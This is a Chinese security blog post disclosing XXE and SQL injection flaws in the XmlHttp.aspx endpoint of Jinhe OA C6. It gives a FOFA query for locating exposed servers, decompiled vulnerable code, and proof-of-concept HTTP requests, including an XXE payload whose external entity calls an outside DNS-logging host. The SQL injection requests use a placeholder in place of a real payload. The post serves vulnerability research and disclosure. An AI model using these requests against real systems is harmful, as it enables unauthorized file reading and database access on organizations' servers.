---
title: "金和OA JHSoft.Web.Departments/XmlHttp.aspx XXE+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-Departments-XmlHttp-xxe.html
asset_dir: assets/金和oa-jhsoft.web.departmentsxmlhttp.aspx-xxe+sql注入漏洞
---

# 金和OA JHSoft.Web.Departments/XmlHttp.aspx XXE+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/28 13:31
- 251浏览
- [0评论](#comment)
- 18分钟阅读

深入探索

XmlHttp

软件

数据库

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `JHSoft.Web.Departments/XmlHttp.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

脚本语言

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

漏洞扫描器

漏洞扫描服务

防火墙软件

直接根据 `JHSoft.Web.Departments/XmlHttp.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Departments.dll` 将其进行反编译后找到 **XmlHttp** 的处理逻辑

```
public class XmlHttp : Page
{
  protected void Page_Load(object sender, EventArgs e)
  {
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.Load(this.Request.InputStream);
    string innerText = xmlDocument.SelectSingleNode("//root//Flag").InnerText;
    if (innerText == null)
      return;
    if (!string.op_Equality(innerText, "GetSubDeptsByID"))
    {
      if (!string.op_Equality(innerText, "IsCompany"))
        return;
      this.GetIsCompany(xmlDocument.DocumentElement.SelectSingleNode("//root//deptid").InnerText.Trim());
    }
    else
      this.GetSubDeptsByID(Convert.ToString(xmlDocument.DocumentElement.SelectSingleNode("//root//deptid").InnerText));
  }
```

请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

同时`GetIsCompany`与`GetSubDeptsByID`方法还存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞

[![金和OA JHSoft.Web.Departments/XmlHttp.aspx XXE+SQL注入漏洞](images/img-001-1484b73194a5.webp)](https://image.mrxn.net/7b6c504ed4254a4ba15d56bf7e25dfd2.webp)

[![金和OA JHSoft.Web.Departments/XmlHttp.aspx XXE+SQL注入漏洞](images/img-002-c3f3f6610ae0.webp)](https://image.mrxn.net/92708b53d7f34482ada9ae14cbb968ec.webp)

## GetSubDeptsByID

深入探索

网络安全会议

恶意软件分析工具

Nessus

[![金和OA JHSoft.Web.Departments/XmlHttp.aspx XXE+SQL注入漏洞](images/img-003-501cfe83bb3f.webp)](https://image.mrxn.net/a686b39840f34beea8d5e3d20d926da9.webp)

[![金和OA JHSoft.Web.Departments/XmlHttp.aspx XXE+SQL注入漏洞](images/img-004-0b9e09e08fe0.webp)](https://image.mrxn.net/0663ee405aa745329067d1d289dc737a.webp)

# 漏洞复现

## XXE

```
POST /c6/JHSoft.Web.Departments/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

SQL注入检测工具

[![金和OA JHSoft.Web.Departments/XmlHttp.aspx XXE+SQL注入漏洞](images/img-005-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

## SQL

### GetSubDeptsByID

```
POST /c6/JHSoft.Web.Departments/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<root>
<Flag>GetSubDeptsByID</Flag>
<deptid>SQLI_POC</deptid>
</root>
```

[![金和OA JHSoft.Web.Departments/XmlHttp.aspx XXE+SQL注入漏洞](images/img-006-6fbfb81e83a0.webp)](https://image.mrxn.net/b6b012a7629f450ca905713304eda5ad.webp)

成功延时 4 秒

代码安全审计

### IsCompany

```
POST /c6/JHSoft.Web.Departments/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<root>
<Flag>IsCompany</Flag>
<deptid>SQLI_POC</deptid>
</root>
```

[![金和OA JHSoft.Web.Departments/XmlHttp.aspx XXE+SQL注入漏洞](images/img-007-e85346cfe1b7.webp)](https://image.mrxn.net/cfd0c929227d44c194c31962d2494461.webp)

也成功延时 4 秒

漏洞修复方案

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.GetSubDeptsByID](#toc-4-1-)
- [5.漏洞复现](#toc-5-)
- [5.1.XXE](#toc-5-1-)
- [5.2.SQL](#toc-5-2-)
- [5.2.1.GetSubDeptsByID](#toc-5-2-1-)
- [5.2.2.IsCompany](#toc-5-2-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

计算机服务器
